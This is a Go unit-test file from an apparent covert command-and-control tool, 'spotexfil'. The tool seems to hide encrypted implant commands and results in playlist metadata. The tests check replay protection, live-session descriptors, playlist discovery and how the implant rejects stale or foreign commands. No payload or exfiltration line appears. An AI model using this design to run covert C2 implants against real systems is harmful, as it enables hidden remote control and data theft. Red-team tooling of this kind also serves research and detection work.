package c2

import (
	"testing"
	"time"

	"github.com/sourcefrenchy/spotexfil/pkg/protocol"
)

func TestIsLiveMeta(t *testing.T) {
	cases := []struct {
		name string
		meta map[string]interface{}
		want bool
	}{
		{"true", map[string]interface{}{"live": true}, true},
		{"false", map[string]interface{}{"live": false}, false},
		{"missing", map[string]interface{}{"c": "res", "seq": 1}, false},
		{"nil map", nil, false},
		{"wrong type string", map[string]interface{}{"live": "true"}, false},
		{"wrong type int", map[string]interface{}{"live": 1}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := protocol.IsLiveMeta(tc.meta); got != tc.want {
				t.Fatalf("IsLiveMeta(%v) = %v, want %v", tc.meta, got, tc.want)
			}
		})
	}
}

func TestSeqTracker(t *testing.T) {
	tr := &seqTracker{}

	if !tr.accept(1) {
		t.Fatal("first seq should be accepted")
	}
	if tr.accept(1) {
		t.Fatal("equal seq (replay) should be skipped")
	}
	if !tr.accept(3) {
		t.Fatal("newer seq should be accepted")
	}
	if tr.accept(2) {
		t.Fatal("out-of-order older seq should be skipped")
	}
	if tr.accept(3) {
		t.Fatal("replay of current seq should be skipped")
	}
	if !tr.accept(4) {
		t.Fatal("next seq should be accepted")
	}
	// Control messages (negative seq, e.g. shutdown) are never deduped
	if !tr.accept(-1) || !tr.accept(-1) {
		t.Fatal("negative control seqs should always be accepted")
	}
	// After control messages, normal dedupe state is untouched
	if tr.accept(4) {
		t.Fatal("seq already seen before control message should be skipped")
	}
	if !tr.accept(5) {
		t.Fatal("newer seq after control message should be accepted")
	}
}

func TestLiveSessionDescRoundtrip(t *testing.T) {
	key := "test-live-session-key"

	desc, err := protocol.LiveSessionDesc(protocol.ChannelRes, 42, "payload-data", key)
	if err != nil {
		t.Fatalf("LiveSessionDesc: %v", err)
	}

	// Meta must carry the live marker
	meta, _, err := protocol.DecryptChunkDesc(desc, key)
	if err != nil {
		t.Fatalf("DecryptChunkDesc: %v", err)
	}
	if !protocol.IsLiveMeta(meta) {
		t.Fatal("roundtripped meta missing live marker")
	}

	seq, data, err := protocol.ParseLiveSessionDesc(desc, key)
	if err != nil {
		t.Fatalf("ParseLiveSessionDesc: %v", err)
	}
	if seq != 42 || data != "payload-data" {
		t.Fatalf("roundtrip mismatch: seq=%d data=%q", seq, data)
	}

	// Wrong key must fail
	if _, _, err := protocol.ParseLiveSessionDesc(desc, "wrong-key"); err == nil {
		t.Fatal("parse with wrong key should fail")
	}

	// A non-live description must be rejected by the live parser
	plain, err := protocol.EncryptChunkDesc(
		map[string]interface{}{"c": "res", "i": 1, "seq": 7}, "x", key)
	if err != nil {
		t.Fatalf("EncryptChunkDesc: %v", err)
	}
	if _, _, err := protocol.ParseLiveSessionDesc(plain, key); err == nil {
		t.Fatal("non-live description should not parse as live")
	}
}

func TestFindLiveSession(t *testing.T) {
	groups := map[int][]protocol.ChunkMeta{
		3: {{PlaylistID: "pl-old", Meta: map[string]interface{}{"live": true}}},
		7: {{PlaylistID: "pl-new", Meta: map[string]interface{}{"live": true}}},
		9: {{PlaylistID: "pl-classic", Meta: map[string]interface{}{"c": "res"}}},
	}
	id, seq, ok := findLiveSession(groups)
	if !ok || id != "pl-new" || seq != 7 {
		t.Fatalf("findLiveSession = (%q, %d, %v), want (pl-new, 7, true)", id, seq, ok)
	}

	// No live playlist present
	classic := map[int][]protocol.ChunkMeta{
		1: {{PlaylistID: "pl-a", Meta: map[string]interface{}{"c": "cmd"}}},
	}
	if _, _, ok := findLiveSession(classic); ok {
		t.Fatal("findLiveSession should report ok=false without live meta")
	}

	// Live meta but no playlist ID is not discoverable
	noID := map[int][]protocol.ChunkMeta{
		1: {{Meta: map[string]interface{}{"live": true}}},
	}
	if _, _, ok := findLiveSession(noID); ok {
		t.Fatal("findLiveSession should require a playlist ID")
	}
}

func TestHandleCommandPayload(t *testing.T) {
	key := "testkey"
	imp := NewImplantWithOptions(nil, key,
		ImplantOptions{Interval: 20, Quiet: true, Live: true})
	if !imp.live {
		t.Fatal("ImplantOptions.Live should be stored on the implant")
	}

	// Valid command: dispatched async, seq marked processed
	msg := protocol.NewC2Message("nosuchmodule", 5)
	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), key)
	if err != nil {
		t.Fatalf("EncodeMessage: %v", err)
	}
	imp.handleCommandPayload(5, encoded)

	select {
	case r := <-imp.resultCh:
		if r.Seq != 5 || r.Status != "error" {
			t.Fatalf("unexpected result: seq=%d status=%s", r.Seq, r.Status)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("expected a result for the dispatched command")
	}

	imp.seqMu.Lock()
	processed := imp.processedSeqs[5]
	imp.seqMu.Unlock()
	if !processed {
		t.Fatal("seq 5 should be marked processed")
	}

	// Stale timestamp: rejected, not processed
	stale := protocol.NewC2Message("nosuchmodule", 6)
	stale.Ts = float64(time.Now().Unix() - 400)
	encStale, _ := protocol.EncodeMessage(stale.ToCommandMap(), key)
	imp.handleCommandPayload(6, encStale)
	imp.seqMu.Lock()
	if imp.processedSeqs[6] {
		imp.seqMu.Unlock()
		t.Fatal("stale command should not be processed")
	}
	imp.seqMu.Unlock()

	// Session mismatch: rejected, not processed
	other := protocol.NewC2Message("nosuchmodule", 7)
	other.SessionID = "some-other-session"
	encOther, _ := protocol.EncodeMessage(other.ToCommandMap(), key)
	imp.handleCommandPayload(7, encOther)
	imp.seqMu.Lock()
	if imp.processedSeqs[7] {
		imp.seqMu.Unlock()
		t.Fatal("command bound to another session should not be processed")
	}
	imp.seqMu.Unlock()

	// Garbage payload: silently discarded
	imp.handleCommandPayload(8, "not-a-valid-payload")
	imp.seqMu.Lock()
	if imp.processedSeqs[8] {
		imp.seqMu.Unlock()
		t.Fatal("undecryptable payload should not be processed")
	}
	imp.seqMu.Unlock()
}
